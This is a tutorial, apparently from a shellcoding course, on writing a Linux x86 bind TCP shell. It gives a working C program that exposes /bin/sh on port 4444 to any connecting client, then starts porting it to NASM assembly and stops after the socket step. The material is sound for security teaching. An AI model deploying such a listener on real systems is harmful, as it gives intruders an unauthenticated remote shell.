# Bind TCP Shell

Today, we will deal with the process of creating Bind TCP Shell from scratch. As a rule, we distinguish between two types of shells that interest the pentester:
- Bind TCP Shell
- Reverse TCP Shell
In the first case, it involves opening a listening port on the victim's system so that the attacker can remotely connect to his shell.

First, we'll try to reproduce this behavior using a C program.

```c
#include <stdio.h>
#include <netinet/in.h>

// Change the correct port here
#define PORT 4444

int main(int argc, char **argv)
{	
	// sys_socket()	- Creating a socket (interface) for communication
	int bind_socket = socket(AF_INET, SOCK_STREAM, 0);
	
	// sys_bind() - Binding to a specified address and port 
	struct sockaddr_in address;
	address.sin_addr.s_addr = INADDR_ANY;
	address.sin_port = htons(PORT);
	address.sin_family = AF_INET;
	bind(bind_socket,(struct sockaddr *)&address, sizeof(address));
	
	// sys_listen() - Listening for incoming connection 
	listen(bind_socket,0);
	
	// sys_accept() - Accepting the incoming connection
	int sock = accept(bind_socket,NULL,NULL);
	
	// sys_dup2() - Configuring STDIN/STDOUT and STDERR for proper shell functioning
	dup2(sock,2);	// STDERR
	dup2(sock,1);	// STDOUT
	dup2(sock,0);	// STDIN
	
	// sys_execve() - Establishing a shell using /bin/sh
	execve("/bin/sh",NULL,NULL);
	
	return 0;
}
```

As we can see, in order to create a properly working program, it is necessary to use several so-called system calls. In this case, they are:

- sys_socket ()
- sys_bind ()
- sys_listen ()
- sys_accept ()
- sys_dup2 ()
- sys_ execve ()

They are responsible for the whole process that the computer must perform to finally end with an open port waiting for connection.

So let's start creating our shellcode using NASM. I will try to divide this process into parts, distinguishing between different system calls called in the course.

First, we will start by clearing the registers we use, because in the case of the C language wrapper that we will be using, it may turn out to be very important (registers are not empty at the time of transition to the _start function).
```nasm
global _start

section .text
_start:

cleaning:
	; cleaning all registers for further usage
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
```
Then, we proceed to create the socket. For this purpose, we will use socketcall () syscall, which will allow us to easily call subsequent types of system calls (socket, bind, listen ....).

At this point I would like to explain the principle of system calls. Their list, in the case of systems based on intel x86 processors, can be found in the file:
- /usr/include/i386-linux-gnu/asm/unistd_32.h

Each call system has its own identifier, which if you want to call directly describes it. For example, socketcall () has the identifier 102, which can be easily checked by grepping its name.
```sh
$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socketcall
#define __NR_socketcall 102
```
In addition, in order to call the system call, in most cases you will need to set the appropriate arguments (system calls should be treated as a function) in the correct registers and order.

Processor registers can be used as "containers" for arguments. In the case of system calls, it looks like this:
- EAX is responsible for the system call identifier
- EBX holds the first argument
- ECX holds the second argument
- EDX stores the third argument
- ESI stores the fourth argument
- EDI stores the fifth argument

Situations where more than five arguments should be used fall outside the scope of this article.

In the case of socketcall () syscall, the situation looks slightly different. 
Due to the fact that other types of system calls will be called with it, the arguments describing these types must be placed in the reverse order (!) On the stack, and then the ECX register (second argument) must point to the top of the stack, in such way that the processor can easily get to the called syscall arguments.

So we know that there must be 102 in the EAX registry. How do you know what further arguments are required? In most cases, use the man command.
```sh
$ man 2 socketcall
SOCKETCALL(2)              Linux Programmer's Manual             SOCKETCALL(2)

NAME
       socketcall - socket system calls

SYNOPSIS
       int socketcall(int call, unsigned long *args);

DESCRIPTION
       socketcall()  is  a  common  kernel  entry  point for the socket system
       calls.  call determines which socket function to invoke.   args  points
       to a block containing the actual arguments, which are passed through to
       the appropriate call.
```
We see, therefore, that this syscall accepts two arguments. The first is socket function to invoke (for example, sys_socket ()), the second indicates the arguments of this function (top of the stack in ECX).

The first function we call is sys_socket. Let's check its unique identifier.
For "minor" syscalls called by socketcall (), their list is in the file:
- /usr/include/linux/net.h
```sh
$ cat /usr/include/linux/net.h | grep sys_socket
#define SYS_SOCKET	1		/* sys_socket(2)		
```
Identifier is 1, let's check what arguments are expected. 
```sh
$ man 2 socket | grep "int socket"
int socket(int domain, int type, int protocol);
```
In most cases, the man command accurately describes what each argument means and where we can find the values that describe it. If not, everything is in Google :)
- AF_INET = 2 (PF_INET)
```sh
$ vim /usr/include/i386-linux-gnu/bits/socket.h +122

#define AF_INET    PF_INET

$ vim /usr/include/i386-linux-gnu/bits/socket.h +78

#define PF_INET         2       /* IP protocol family
```
- SOCK_STREAM = 1
```sh
$ vim /usr/include/i386-linux-gnu/bits/socket.h +42

SOCK_STREAM = 1,              /* Sequenced, reliable, connection-based byte streams.  */
```
- IPPROTO_IP = 0
```sh
$ vim /usr/include/netinet/in.h + 34

IPPROTO_IP = 0,        /* Dummy protocol for TCP.  */
```
These arguments must be thrown in the reverse order due to the specifics of the stack.

Let's move to the NASM code:
```nasm
sys_socket:
	; {C code} --> int bind_socket = socket(AF_INET, SOCK_STREAM, 0);
	
	; syscall definition
	mov al, 102 		; syscall - socketcall
	mov bl, 1		; socketcall type - sys_socket

	; pushing the sys_socket atributes in reverse order (AF_INET, SOCK_STREAM, IPPROTO_IP)
	xor esi, esi		
	push esi		; IPPROTO_IP = 0 (null)
	push 1			; SOCK_STREAM = 1
	push 2			; AF_INET = 2 (PF_INET)

	mov ecx, esp 		; directing the stack pointer to sys_socket() function arguments

	int 128			; syscall execution

	mov edx, eax		; saving the bind_socket pointer for further usage
```
